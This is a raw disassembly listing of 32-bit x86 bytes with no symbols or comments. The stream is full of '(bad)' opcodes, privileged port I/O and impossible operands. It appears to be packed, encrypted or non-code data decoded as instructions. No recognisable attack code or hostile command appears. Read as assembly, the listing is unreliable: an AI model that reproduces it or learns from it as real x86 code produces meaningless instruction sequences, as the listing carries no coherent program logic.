  42b4e4:	pushf  
  42b4e5:	mov    ch,0x45
  42b4e7:	fstp   QWORD PTR [ecx]
  42b4e9:	rcr    ah,0xca
  42b4ec:	mov    eax,0xe13d99c8
  42b4f1:	inc    eax
  42b4f2:	push   edi
  42b4f3:	es push ebp
  42b4f5:	dec    ecx
  42b4f6:	sbb    ebx,edx
  42b4f8:	sub    ecx,esp
  42b4fa:	sbb    ch,BYTE PTR [ebx]
  42b4fc:	sub    esi,edx
  42b4fe:	xchg   BYTE PTR [eiz*2-0x56ed89cd],cl
  42b505:	bnd jns 0x42b4a7
  42b508:	xchg   DWORD PTR [eax-0x771f6a4],esi
  42b50e:	mov    ch,0x32
  42b510:	dec    esi
  42b511:	fsubr  DWORD PTR [eax]
  42b513:	in     eax,0x1a
  42b515:	or     dl,BYTE PTR [esi+0x76]
  42b518:	fwait
  42b519:	push   cs
  42b51a:	and    DWORD PTR [edi+0x1526fa81],ecx
  42b520:	inc    ebp
  42b521:	nop
  42b522:	xor    dh,bl
  42b524:	imul   esi,DWORD PTR [esi],0x53818c22
  42b52a:	inc    ecx
  42b52b:	sub    DWORD PTR [esi+edx*1],esi
  42b52e:	adc    ebp,ecx
  42b530:	pop    esp
  42b531:	xchg   DWORD PTR [eax+0x22],edi
  42b534:	ins    DWORD PTR es:[edi],dx
  42b535:	sahf   
  42b536:	js     0x42b594
  42b538:	jb     0x42b570
  42b53a:	mov    dl,0x87
  42b53c:	sub    al,0x1d
  42b53e:	cld    
  42b53f:	ss add eax,edx
  42b542:	or     eax,DWORD PTR [ebp-0x9]
  42b545:	sub    DWORD PTR [edx-0x4b2154db],esi
  42b54b:	scas   al,BYTE PTR es:[edi]
  42b54c:	push   ebp
  42b54d:	pause  
  42b54f:	fld    QWORD PTR [ebx]
  42b551:	push   cs
  42b552:	shl    BYTE PTR [esi],1
  42b554:	clc    
  42b555:	ins    DWORD PTR es:[edi],dx
  42b556:	add    cl,BYTE PTR [ebp-0x712bf9d]
  42b55c:	dec    ebx
  42b55d:	data16 fstp QWORD PTR [edi+0x53]
  42b561:	(bad)  [edx+0x3b1efa73]
  42b568:	jo     0x42b4ea
  42b56a:	cmp    ebx,DWORD PTR [esi-0x4b]
  42b56d:	imul   ecx,DWORD PTR [ebx+esi*8+0x4a],0x7b
  42b572:	mov    ?,WORD PTR [eax+0x1a989381]
  42b578:	push   ss
  42b579:	ret    
  42b57a:	das    
  42b57b:	jbe    0x42b5a8
  42b57d:	dec    ecx
  42b57e:	repz dec edi
  42b580:	xchg   ebp,eax
  42b581:	push   ss
  42b582:	aam    0x3
  42b584:	adc    eax,0x8dab1286
  42b589:	clc    
  42b58a:	ror    DWORD PTR [ebx+0x52],1
  42b58d:	clc    
  42b58e:	in     eax,0xf6
  42b590:	cwde   
  42b591:	xor    BYTE PTR [ecx+ebp*1+0xd],0xcd
  42b596:	iret   
  42b597:	and    edx,DWORD PTR [ecx+0x24987b0a]
  42b59d:	sti    
  42b59e:	retf   0x1146
  42b5a1:	stos   DWORD PTR es:[edi],eax
  42b5a2:	inc    BYTE PTR [edi+0x20]
  42b5a5:	(bad)  
  42b5a6:	jmp    0xc40f39d3
  42b5ab:	sahf   
  42b5ac:	shl    BYTE PTR [edi-0x17476925],1
  42b5b2:	fsub   DWORD PTR [ebx-0x73780449]
  42b5b8:	xchg   DWORD PTR [edi+0x4f],esp
  42b5bb:	in     eax,dx
  42b5bc:	jo     0x42b5b9
  42b5be:	jbe    0x42b54a
  42b5c0:	popa   
  42b5c1:	mov    ebx,0x0
	...
  42b632:	add    BYTE PTR [eax],al
  42b634:	and    al,0x16
  42b636:	outs   dx,BYTE PTR ds:[esi]
  42b637:	(bad)  
  42b638:	jle    0x42b639
  42b63a:	lods   eax,DWORD PTR ds:[esi]
  42b63b:	not    esi
  42b63d:	mov    dl,dh
  42b63f:	add    al,BYTE PTR [eax+0x2c919ddc]
  42b645:	int3   
  42b646:	add    DWORD PTR [eax],eax
  42b648:	test   BYTE PTR [eax],0x0
  42b64b:	add    BYTE PTR [edx-0x2525a10b],dl
  42b651:	sub    ch,BYTE PTR [ebp+0x2b]
  42b654:	test   eax,0x87e097e8
  42b659:	sbb    BYTE PTR [ecx],dh
  42b65b:	(bad)  
  42b65c:	mov    cl,0x50
  42b65e:	(bad)  
  42b65f:	retf   
  42b660:	(bad)  
  42b661:	fldcw  WORD PTR [ebx]
  42b663:	jecxz  0x42b695
  42b665:	mov    ebx,0x68b489b
  42b66a:	ficom  WORD PTR [ebx+edi*1]
  42b66d:	push   0x2dfe75a
  42b672:	xchg   ecx,eax
  42b673:	fist   WORD PTR [bx+di-0x65]
  42b677:	or     edx,ebp
  42b679:	mov    ebx,0x5bf8b53a
  42b67e:	mov    ebp,0x7ba264f3
  42b683:	out    0xd4,eax
  42b685:	out    0xff,al
  42b687:	rcr    BYTE PTR [esi+0x76],1
  42b68a:	xor    al,BYTE PTR [ebx]
  42b68c:	push   es
  42b68d:	mov    ah,0x10
  42b68f:	jecxz  0x42b639
  42b691:	sbb    BYTE PTR [eax+0x36],bh
  42b694:	jge    0x42b6e4
  42b696:	or     eax,0x43c32eb7
  42b69b:	and    dh,cl
  42b69d:	(bad)  
  42b69f:	push   0xa145d4dd
  42b6a4:	mov    bl,0x4a
  42b6a6:	neg    DWORD PTR [edi-0x68a257c9]
  42b6ac:	sti    
  42b6ad:	xchg   esi,eax
  42b6ae:	jle    0x42b72b
  42b6b0:	iret   
  42b6b1:	pop    ebp
  42b6b2:	in     eax,dx
  42b6b3:	pop    es
  42b6b4:	xchg   esp,eax
  42b6b5:	outs   dx,BYTE PTR ds:[esi]
  42b6b6:	jmp    0x97609063
  42b6bb:	push   ds
  42b6bc:	push   DWORD PTR [edi+ebp*4]
  42b6bf:	adc    eax,0x8732b0dd
  42b6c4:	jno    0x42b726
  42b6c6:	xor    DWORD PTR [ecx-0x2b],ebp
  42b6c9:	shl    eax,0x4c
  42b6cc:	inc    ecx
  42b6cd:	push   cs
  42b6ce:	mov    es,WORD PTR [ebx]
  42b6d0:	rol    BYTE PTR [ebx+edx*1],1
  42b6d3:	inc    edx
  42b6d4:	ja     0x42b689
  42b6d6:	push   edx
  42b6d7:	hlt    
  42b6d8:	in     al,0xc5
  42b6da:	inc    ebx
  42b6db:	inc    edi
  42b6dc:	js     0x42b6a7
  42b6de:	inc    edi
  42b6df:	div    BYTE PTR [esi-0x2d]
  42b6e2:	pop    ecx
  42b6e3:	mov    DWORD PTR [ebx-0x7a],edx
  42b6e6:	mov    ebx,0x6e1344ca
  42b6eb:	cld    
  42b6ec:	xchg   edi,eax
  42b6ed:	test   eax,0x33d8e7d3
  42b6f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b6f3:	adc    al,0x5c
  42b6f5:	or     ebp,ecx
  42b6f7:	imul   esi,ebx,0xa294d9db
  42b6fd:	dec    eax
  42b6fe:	adc    ch,BYTE PTR [edx]
  42b700:	xor    DWORD PTR [ebx-0x1a],ebx
  42b703:	dec    ebp
  42b704:	loopne 0x42b68d
  42b706:	xchg   ebx,eax
  42b707:	inc    bx
  42b709:	retf   
  42b70a:	dec    ebx
  42b70b:	aaa    
  42b70c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b70d:	fisttp WORD PTR [ebx-0x17]
  42b710:	add    DWORD PTR [eax],esi
  42b712:	mov    ss,WORD PTR [edi+0x8]
  42b715:	jo     0x42b792
  42b717:	cli    
  42b718:	or     al,0x4d
  42b71a:	or     BYTE PTR [eax+0x60],al
  42b71d:	in     eax,dx
  42b71e:	xchg   BYTE PTR [edx+edi*4+0x365d910a],cl
  42b725:	push   eax
  42b726:	test   BYTE PTR [eax+0x7624bf1e],ah
  42b72c:	jg     0x42b6eb
  42b72e:	bswap  edx
  42b730:	push   ss
  42b731:	in     eax,0x74
  42b733:	pop    es
  42b734:	mov    bh,0xc5
  42b736:	push   ss
  42b737:	mov    ah,0x4
  42b739:	xchg   edi,eax
  42b73a:	shr    ebx,0x2f
  42b73d:	jg     0x42b6ef
  42b73f:	adc    DWORD PTR [esi],edx
  42b741:	rol    BYTE PTR [eax],cl
	...
  42b7b3:	add    BYTE PTR [edx-0x10409c9b],cl
  42b7b9:	mov    edi,0x986a75de
  42b7be:	xor    eax,0xa5ef5bfb
  42b7c3:	(bad)  
  42b7c4:	and    cl,ch
  42b7c6:	add    DWORD PTR [eax],eax
  42b7c8:	test   BYTE PTR [eax],0x0
  42b7cb:	add    BYTE PTR [ebp+0x55],dl
  42b7ce:	in     eax,dx
  42b7cf:	pop    edi
  42b7d0:	daa    
  42b7d1:	mov    ch,ah
  42b7d3:	add    ch,bh
  42b7d5:	xchg   ebx,eax
  42b7d6:	(bad)  
  42b7d7:	(bad)  
  42b7d8:	popa   
  42b7d9:	test   BYTE PTR [ebx+0x40],dl
  42b7dc:	jge    0x42b7ac
  42b7de:	inc    esi
  42b7df:	mov    ah,0xb6
  42b7e1:	call   0xb3b:0x8aaa4c13
  42b7e8:	cmp    DWORD PTR [eax],eax
  42b7ea:	xchg   edi,eax
  42b7eb:	scas   eax,DWORD PTR es:[edi]
  42b7ec:	iret   
  42b7ed:	ds into 
  42b7ef:	fdivr  st(6),st
  42b7f1:	sti    
  42b7f2:	mov    dh,0xac
  42b7f4:	outs   dx,BYTE PTR ds:[esi]
  42b7f5:	cli    
  42b7f6:	ds xchg esi,eax
  42b7f8:	push   ebx
  42b7f9:	call   0xdf56:0xab2f4848
  42b800:	lods   eax,DWORD PTR ds:[esi]
  42b801:	(bad)  
  42b802:	in     al,dx
  42b803:	mov    esp,0xcee2e881
  42b808:	cmc    
  42b809:	lods   al,BYTE PTR ds:[esi]
  42b80a:	es (bad) 
  42b80c:	das    
  42b80d:	mov    al,BYTE PTR [ebx+ebx*4+0x44c36522]
  42b814:	(bad)  
  42b815:	(bad)  
  42b816:	es ja  0x42b7c2
  42b819:	add    BYTE PTR [ebp+0x47237a74],cl
  42b81f:	es iret 
  42b821:	push   ebp
  42b822:	sub    DWORD PTR [edi+eiz*2],ebx
  42b825:	inc    ecx
  42b826:	push   esp
  42b827:	xor    DWORD PTR [eax+0x11fc3e24],0xd6c07a9c
  42b831:	mov    al,ds:0x68c95734
  42b836:	push   edx
  42b837:	loope  0x42b838
  42b839:	dec    eax
  42b83a:	pop    ebx
  42b83b:	or     DWORD PTR [ecx-0x17],ebp
  42b83e:	stos   DWORD PTR es:[edi],eax
  42b83f:	pop    eax
  42b840:	push   ecx
  42b841:	out    0x85,eax
  42b843:	push   0xffffffbe
  42b845:	push   ss
  42b846:	inc    edi
  42b847:	mov    ecx,0xb07b9af
  42b84c:	pop    es
  42b84d:	scas   al,BYTE PTR es:[edi]
  42b84e:	imul   edi,DWORD PTR [ebx-0x38d8002b],0x68eda8c5
  42b858:	pop    es
  42b859:	ret    
  42b85a:	mov    eax,0x9221a95f
  42b85f:	or     al,0x38
  42b861:	(bad)  
  42b862:	dec    ebx
  42b863:	call   0x5440da29
  42b868:	(bad)  
  42b869:	push   edi
  42b86a:	(bad)  
  42b86c:	push   esp
  42b86d:	and    eax,0x6a05efa5
  42b872:	mov    edi,0xb36061b5
  42b877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b878:	stos   BYTE PTR es:[edi],al
  42b879:	das    
  42b87a:	stos   DWORD PTR es:[edi],eax
  42b87b:	in     eax,0x2a
  42b87d:	jle    0x42b848
  42b87f:	cld    
  42b880:	cs push edi
  42b882:	cdq    
  42b883:	jmp    0xb0181ed3
  42b888:	sub    esi,DWORD PTR [ebp+0x416919f9]
  42b88e:	xchg   ecx,eax
  42b88f:	pop    ecx
  42b890:	ja     0x42b8f6
  42b892:	test   eax,0xfa4b282a
  42b897:	es add eax,0x75e22c50
  42b89d:	pusha  
  42b89e:	aaa    
  42b89f:	inc    edi
  42b8a0:	(bad)  
  42b8a1:	js     0x42b90f
  42b8a3:	scas   al,BYTE PTR es:[edi]
  42b8a4:	xchg   DWORD PTR [edx+0x20],esi
  42b8a7:	and    ebp,edx
  42b8a9:	jmp    0x42b84d
  42b8ab:	ud1    esi,ebx
  42b8ae:	sbb    DWORD PTR [ebx],edx
  42b8b0:	popf   
  42b8b1:	(bad)  [esi]
  42b8b3:	sahf   
  42b8b4:	push   0xbe5dac05
  42b8b9:	es jg  0x42b84c
  42b8bc:	xlat   BYTE PTR ds:[ebx]
  42b8bd:	mov    eax,0x584a4455
	...
  42b932:	add    BYTE PTR [eax],al
  42b934:	test   al,0x93
  42b936:	sbb    eax,0xfbee3fee
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	ss push esi
  42b93e:	inc    esp
  42b93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b940:	sub    ebp,DWORD PTR [edi-0x3b]
  42b943:	stc    
  42b944:	sbb    dh,cl
  42b946:	add    DWORD PTR [eax],eax
  42b948:	test   BYTE PTR [eax],0x0
  42b94b:	add    BYTE PTR [ebx+0x76],dh
  42b94e:	pop    ds
  42b94f:	retf   
  42b950:	js     0x42b929
  42b952:	cmovb  esp,DWORD PTR [ebp-0x478cb6d7]
  42b959:	(bad)  
  42b95a:	mov    edx,0x880963bf
  42b95f:	xor    eax,0x845ad16
  42b964:	mov    ch,0x31
  42b966:	push   eax
  42b967:	inc    edx
  42b968:	lock add al,0x63
  42b96b:	sar    DWORD PTR [esi-0x2b],1
  42b96e:	inc    edi
  42b96f:	jns    0x42b9db
  42b971:	and    BYTE PTR [ebx],dh
  42b973:	std    
  42b974:	mov    al,ds:0xa1044bd
  42b979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b97a:	jne    0x42b98c
  42b97c:	pop    esp
  42b97d:	mov    ecx,0xf907b9fc
  42b982:	rcl    BYTE PTR [ebx-0x6d5d00e],0xf4
  42b989:	mov    ebp,0x7cf8f5fd
  42b98e:	dec    ecx
  42b98f:	xor    DWORD PTR [esi+edi*8],0x4f
  42b993:	push   ebp
  42b994:	repz das 
  42b996:	sub    al,ah
  42b998:	pop    esi
  42b999:	sub    DWORD PTR [edi],eax
  42b99b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b99c:	inc    ebx
  42b99d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b99e:	ins    BYTE PTR es:[edi],dx
  42b99f:	inc    esi
  42b9a0:	pop    ds
  42b9a1:	aad    0xe2
  42b9a3:	xchg   edi,eax
  42b9a4:	jg     0x42b9b5
  42b9a6:	mov    edi,0xacbae977
  42b9ab:	nop
  42b9ac:	push   esi
  42b9ad:	stc    
  42b9ae:	dec    edx
  42b9af:	jo     0x42ba1a
  42b9b1:	mov    BYTE PTR [eax-0x58],dh
  42b9b4:	mov    ebx,0xfb420b73
  42b9b9:	test   al,0xfa
  42b9bb:	ins    DWORD PTR es:[edi],dx
  42b9bc:	pusha  
  42b9bd:	daa    
  42b9be:	pop    edx
  42b9bf:	cwde   
  42b9c0:	mov    esi,DWORD PTR [ecx+0x6746bc19]
  42b9c6:	ins    DWORD PTR es:[edi],dx
  42b9c7:	inc    edi
  42b9c8:	push   edi
  42b9c9:	xchg   edi,eax
  42b9ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b9cb:	loop   0x42b9c9
  42b9cd:	cli    
  42b9ce:	fwait
  42b9cf:	pop    ecx
  42b9d0:	pop    esi
  42b9d1:	(bad)  
  42b9d3:	popf   
  42b9d4:	data16 mov ds,WORD PTR [ebx]
  42b9d7:	lds    edi,FWORD PTR [ebx-0x42]
  42b9da:	into   
  42b9db:	mov    ds:0x78a24a54,eax
  42b9e0:	retf   
  42b9e1:	or     BYTE PTR [ebx-0x42],cl
  42b9e4:	test   bl,bh
  42b9e6:	and    dl,ch
  42b9e8:	mov    al,0xab
  42b9ea:	test   DWORD PTR [ebx],0xd34e7a6b
  42b9f0:	push   0x821cff03
  42b9f5:	imul   esp,DWORD PTR [ebx+eiz*8],0xd6e91617
  42b9fc:	push   fs
  42b9fe:	cs dec esi
  42ba00:	and    esp,eax
  42ba02:	mov    ah,0x8
  42ba04:	pop    esi
  42ba05:	pop    es
  42ba06:	or     al,0x6b
  42ba08:	mov    ecx,0x83b19e94
  42ba0d:	cs jle 0x42b997
  42ba10:	xchg   edi,eax
  42ba11:	add    al,0x19
  42ba13:	cld    
  42ba14:	xchg   edi,eax
  42ba15:	xor    bh,al
  42ba17:	xor    DWORD PTR [ebp-0x1c],edi
  42ba1a:	das    
  42ba1b:	xor    al,0xad
  42ba1d:	icebp  
  42ba1e:	mov    dh,0xc4
  42ba20:	dec    ebx
  42ba21:	mov    eax,0x294e713d
  42ba26:	xor    dl,BYTE PTR [eax-0x46b13580]
  42ba2c:	rol    DWORD PTR [esi-0x2b21fb57],0x1a
  42ba33:	dec    ecx
  42ba34:	(bad)  
  42ba35:	and    al,0xc0
  42ba37:	sub    bh,ch
  42ba39:	sub    BYTE PTR [ecx],ch
  42ba3b:	in     al,dx
  42ba3c:	xor    edi,ebx
  42ba3e:	push   edi
  42ba3f:	push   0x1269
	...
  42bab4:	ds push cs
  42bab6:	sub    al,0x5d
  42bab8:	cmp    al,0x7f
  42baba:	jg     0x42bb2b
  42babc:	cmp    al,BYTE PTR [esi-0x29e6bcb4]
  42bac2:	cmp    esi,DWORD PTR [edi+0x1cf0e]
  42bac8:	test   BYTE PTR [eax],0x0
  42bacb:	add    BYTE PTR [eax+eax*1],bh
  42bace:	pop    esp
  42bacf:	lods   eax,DWORD PTR ds:[esi]
  42bad0:	aaa    
  42bad1:	or     DWORD PTR [esi+0x71ea6ef8],eax
  42bad7:	or     esi,DWORD PTR [ebp-0x3a]
  42bada:	xchg   ebx,eax
  42badb:	jecxz  0x42baeb
  42badd:	dec    ebp
  42bade:	sub    al,0x17
  42bae0:	aas    
  42bae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bae2:	mov    edx,0xfb7d4439
  42bae7:	ror    DWORD PTR [edi-0x40],1
  42baea:	sahf   
  42baeb:	or     eax,0xbf0531ff
  42baf0:	in     al,dx
  42baf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42baf2:	dec    eax
  42baf3:	(bad)  
  42baf5:	pop    eax
  42baf6:	pop    ecx
  42baf7:	jne    0x42bb64
  42baf9:	push   edi
  42bafa:	loop   0x42ba9d
  42bafc:	loop   0x42bb50
  42bafe:	cmp    al,BYTE PTR [ecx-0x7b761435]
  42bb04:	or     DWORD PTR ds:0x4ee225f4,edi
  42bb0a:	cmp    eax,0x832ef411
  42bb0f:	mov    al,ds:0x16fd294f
  42bb14:	xchg   BYTE PTR [eax-0x3f],bh
  42bb17:	mov    ?,WORD PTR [ecx-0x3b]
  42bb1a:	mov    cs,WORD PTR [ecx]
  42bb1c:	jmp    0x8a07:0x5baf5c09
  42bb23:	ins    BYTE PTR es:[edi],dx
  42bb24:	ins    DWORD PTR es:[edi],dx
  42bb25:	stos   DWORD PTR es:[edi],eax
  42bb26:	bound  esp,QWORD PTR [edx-0x69]
  42bb29:	ja     0x42badf
  42bb2b:	ds jp  0x42bae8
  42bb2e:	jg     0x42baee
  42bb30:	mov    cs,WORD PTR [edi]
  42bb32:	fidivr WORD PTR [ebp-0x7a]
  42bb35:	lods   eax,DWORD PTR ds:[esi]
  42bb36:	push   cs
  42bb37:	scas   eax,DWORD PTR es:[edi]
  42bb38:	xchg   DWORD PTR [eax+0x3a],esi
  42bb3b:	cwde   
  42bb3c:	or     dl,BYTE PTR [edx+0x13d2b01f]
  42bb42:	inc    eax
  42bb43:	sub    DWORD PTR [edx*2-0x12bb23b1],esi
  42bb4a:	xchg   ebx,eax
  42bb4b:	push   edx
  42bb4c:	repnz (bad) 
  42bb4e:	fisubr WORD PTR [ecx-0xb]
  42bb51:	in     eax,0xa2
  42bb53:	lds    eax,FWORD PTR [eax+0xf]
  42bb56:	xor    BYTE PTR [edx-0x3f],0x49
  42bb5a:	xchg   esp,eax
  42bb5b:	push   cs
  42bb5c:	mov    bh,0xe1
  42bb5e:	jg     0x42bb3c
  42bb60:	mov    al,ds:0xa1c7dbfb
  42bb65:	or     DWORD PTR [eax+0x10],0x8c7fc679
  42bb6c:	sub    al,0x31
  42bb6e:	push   edx
  42bb6f:	lock aaa 
  42bb71:	mov    ch,0xc0
  42bb73:	mov    al,0x16
  42bb75:	dec    edx
  42bb76:	pop    esi
  42bb77:	mov    DWORD PTR [esi],eax
  42bb79:	mov    ch,0xf
  42bb7b:	jno    0x42bb3d
  42bb7d:	mov    ecx,0xae22b594
  42bb82:	mov    WORD PTR [edi+0x671a18dd],?
  42bb88:	jb     0x42bb6f
  42bb8a:	mov    cl,0xac
  42bb8c:	jmp    0x42bba3
  42bb8e:	out    dx,al
  42bb8f:	jb     0x42bbf4
  42bb91:	loopne 0x42bbd3
  42bb93:	xchg   cl,bh
  42bb95:	call   0x50d6ea28
  42bb9a:	and    cl,ah
  42bb9c:	sub    eax,0x7e8a53af
  42bba1:	mov    ebp,0x27a88228
  42bba6:	mov    esi,0x499e27a1
  42bbab:	adc    bl,BYTE PTR [edi+eiz*1]
  42bbae:	(bad)  
  42bbaf:	das    
  42bbb0:	pop    ebx
  42bbb1:	mov    al,0x64
  42bbb3:	or     BYTE PTR [esi],dl
  42bbb5:	cmp    eax,0x2eee8c46
  42bbba:	push   es
  42bbbb:	push   ss
  42bbbc:	adc    eax,0xfe8e44d4
  42bbc1:	xchg   ebp,eax
	...
  42bc32:	add    BYTE PTR [eax],al
  42bc34:	jmp    0xdf7cd86b
  42bc39:	ds out dx,eax
  42bc3b:	repz ffreep st(2)
  42bc3e:	(bad)  
  42bc3f:	aam    0xad
  42bc41:	ins    BYTE PTR es:[edi],dx
  42bc42:	js     0x42bc5d
  42bc44:	add    al,0xd0
  42bc46:	add    DWORD PTR [eax],eax
  42bc48:	test   BYTE PTR [eax],0x0
  42bc4b:	add    BYTE PTR [edi],bl
  42bc4d:	mov    ?,WORD PTR [ebx+0x36ae6bef]
  42bc53:	mov    esi,0x2212d0dd
  42bc58:	das    
  42bc59:	jl     0x42bcd8
  42bc5b:	xchg   esi,eax
  42bc5c:	mov    ebx,0x5c475ff0
  42bc61:	fwait
  42bc62:	aaa    
  42bc63:	cmp    dh,BYTE PTR [eax+0x2893d6db]
  42bc69:	jns    0x42bc53
  42bc6b:	push   cs
  42bc6c:	mov    al,ds:0xd1e5a75
  42bc71:	add    BYTE PTR [esi+0x61],ah
  42bc74:	fwait
  42bc75:	pop    ss
  42bc76:	sbb    eax,0x6687d9d6
  42bc7b:	inc    esp
  42bc7c:	jo     0x42bce3
  42bc7e:	(bad)  
  42bc80:	sahf   
  42bc81:	imul   edx,DWORD PTR gs:[ebx],0x336850ee
  42bc88:	addr16 cmp al,0x70
  42bc8b:	xchg   ebp,eax
  42bc8c:	(bad)  
  42bc8d:	std    
  42bc8e:	retf   
  42bc8f:	or     ebp,DWORD PTR fs:[edx]
  42bc92:	mov    al,ds:0x8e3c39d3
  42bc97:	imul   eax,DWORD PTR [esp+edx*2+0x269ffb2b],0x309ba258
  42bca2:	outs   dx,DWORD PTR ds:[esi]
  42bca3:	std    
  42bca4:	pop    esp
  42bca5:	sar    DWORD PTR ds:[ebp+0x1d],cl
  42bca9:	xchg   ecx,eax
  42bcaa:	or     ch,BYTE PTR [edx]
  42bcac:	sbb    bl,ch
  42bcae:	mov    ds:0xdc38a897,eax
  42bcb3:	es jecxz 0x42bc4a
  42bcb6:	loopne 0x42bcfb
  42bcb8:	fld    DWORD PTR [edx+0x6d118db9]
  42bcbe:	out    0x14,eax
  42bcc0:	nop
  42bcc1:	sub    eax,ecx
  42bcc3:	aas    
  42bcc4:	(bad)  
  42bcc5:	or     edi,DWORD PTR [eax-0x3aebc4e9]
  42bccb:	add    cl,bh
  42bccd:	xor    bl,BYTE PTR [esi]
  42bccf:	and    DWORD PTR [ecx+0x5039c2bb],edx
  42bcd5:	push   es
  42bcd6:	mov    al,ds:0x5dfae6ff
  42bcdb:	inc    edx
  42bcdc:	add    al,0x19
  42bcde:	and    BYTE PTR [ebx+0x6b],al
  42bce1:	sub    bh,0x7f
  42bce4:	or     BYTE PTR [ebp-0x6a],cl
  42bce7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bce8:	arpl   WORD PTR [ebx-0x48],di
  42bceb:	jmp    0xbe95256
  42bcf0:	ds test eax,0xafb08e16
  42bcf6:	jp     0x42bd56
  42bcf8:	jae    0x42bd30
  42bcfa:	ins    DWORD PTR es:[edi],dx
  42bcfb:	mov    eax,0x438d4e03
  42bd00:	rcl    dl,0x3b
  42bd03:	push   esp
  42bd04:	cmp    ebx,DWORD PTR [eax+0x60c67800]
  42bd0a:	(bad)  
  42bd0b:	mov    ecx,0x949fe2e4
  42bd10:	cs out 0x15,eax
  42bd13:	in     al,0xe4
  42bd15:	out    dx,al
  42bd16:	out    dx,eax
  42bd17:	mov    ds:0x93b2e71f,eax
  42bd1c:	push   ebp
  42bd1d:	nop
  42bd1e:	or     eax,0xb5636202
  42bd23:	sub    al,0xb5
  42bd25:	xor    esp,DWORD PTR [ebx-0x5a]
  42bd28:	xchg   ebp,eax
  42bd29:	test   eax,0x590abc5a
  42bd2e:	cmp    BYTE PTR [eax],ah
  42bd30:	dec    esi
  42bd31:	movq   mm6,QWORD PTR [ecx+0x59]
  42bd35:	popa   
  42bd36:	sub    al,0x63
  42bd38:	mov    ds:0x55ae491,al
  42bd3d:	lea    esp,[edi+0x2cfb1b]
	...
  42bdb3:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42bdb9:	mov    edi,0x5143f7ff
  42bdbe:	jne    0x42bdcc
  42bdc0:	call   0xfa9e8aca
  42bdc5:	rol    BYTE PTR [ecx],1
  42bdc7:	add    dh,dh
  42bdc9:	add    BYTE PTR [eax],al
  42bdcb:	add    ah,bl
  42bdcd:	ja     0x42bd87
  42bdcf:	das    
  42bdd0:	xchg   BYTE PTR [ebx],bh
  42bdd2:	mov    bl,0xe3
  42bdd4:	pop    esi
  42bdd5:	cmpxchg DWORD PTR [eax],esi
  42bdd8:	cmp    al,0xab
  42bdda:	in     al,dx
  42bddb:	push   esp
  42bddc:	ins    BYTE PTR es:[edi],dx
  42bddd:	scas   eax,DWORD PTR es:[edi]
  42bdde:	out    0xe4,eax
  42bde0:	pop    esi
  42bde1:	xor    esi,ecx
  42bde3:	xchg   esi,eax
  42bde4:	lea    ebp,[eax+0x13]
  42bde7:	jmp    0xb442:0xa1ed4e72
  42bdee:	(bad)  
  42bdef:	cdq    
  42bdf0:	jnp    0x42bdae
  42bdf2:	dec    esi
  42bdf3:	test   al,dh
  42bdf5:	std    
  42bdf6:	arpl   bp,sp
  42bdf8:	sbb    DWORD PTR [ecx-0x6d088419],edx
  42bdfe:	or     DWORD PTR [eax+0x35cdbc19],edx
  42be04:	outs   dx,DWORD PTR ds:[esi]
  42be05:	or     edx,edx
  42be07:	pop    ebp
  42be08:	pusha  
  42be09:	fmul   QWORD PTR [edi-0x68533846]
  42be0f:	and    eax,DWORD PTR [ebp+0x33]
  42be12:	or     bh,BYTE PTR [edi-0x19f0af9]
  42be18:	add    cl,BYTE PTR [edx+0x36d55675]
  42be1e:	loope  0x42bdc6
  42be20:	xchg   BYTE PTR ds:0x47302f42,dl
  42be26:	dec    esp
  42be27:	nop
  42be28:	xchg   ecx,eax
  42be29:	pop    esi
  42be2a:	sahf   
  42be2b:	pop    esi
  42be2c:	int    0xae
  42be2e:	stos   BYTE PTR es:[edi],al
  42be2f:	cdq    
  42be30:	pop    ebx
  42be31:	imul   ebx,DWORD PTR [edx-0x6a8a7e0d],0xf06c8663
  42be3b:	xor    dh,BYTE PTR [ebp-0xa]
  42be3e:	in     al,dx
  42be3f:	jns    0x42be5c
  42be41:	xchg   edx,eax
  42be42:	jnp    0x42be02
  42be44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be45:	jnp    0x42be7c
  42be47:	xchg   BYTE PTR [edx],dh
  42be49:	adc    DWORD PTR [ecx-0x63538f46],ecx
  42be4f:	mov    edx,0x677d9476
  42be54:	mov    bl,BYTE PTR [edi+0x8]
  42be57:	xchg   BYTE PTR [edx],dl
  42be59:	xchg   esp,eax
  42be5a:	xchg   BYTE PTR [ecx-0x731f53ac],al
  42be60:	jecxz  0x42be29
  42be62:	imul   esp,DWORD PTR [esi+0x19be86d],0x7b
  42be69:	leave  
  42be6a:	pop    esp
  42be6b:	and    BYTE PTR [esi],bh
  42be6d:	scas   al,BYTE PTR es:[edi]
  42be6e:	or     eax,0x193cca57
  42be73:	(bad)  
  42be74:	fldenv [eiz*4+0x1e331a88]
  42be7b:	cwde   
  42be7c:	dec    edx
  42be7d:	pop    ebp
  42be7e:	push   ebp
  42be7f:	dec    eax
  42be80:	push   ds
  42be81:	enter  0x7e49,0x52
  42be85:	mov    eax,0x775f072e
  42be8a:	jecxz  0x42beb0
  42be8c:	(bad)  
  42be8d:	repz fnsave [ecx]
  42be90:	inc    ebx
  42be91:	xor    edi,ebp
  42be93:	lea    edi,fs:[esi]
  42be96:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be98:	dec    esi
  42be99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be9a:	push   esp
  42be9b:	push   ebp
  42be9c:	cmp    dh,dh
  42be9e:	mov    dl,0xcb
  42bea0:	jp     0x42be6e
  42bea2:	inc    eax
  42bea3:	aam    0x36
  42bea5:	mov    eax,ds:0x2083d2ea
  42beaa:	xlat   BYTE PTR ds:[ebx]
  42beab:	sbb    dh,BYTE PTR [eax-0x33d92ac]
  42beb1:	jbe    0x42be49
  42beb3:	je     0x42bed2
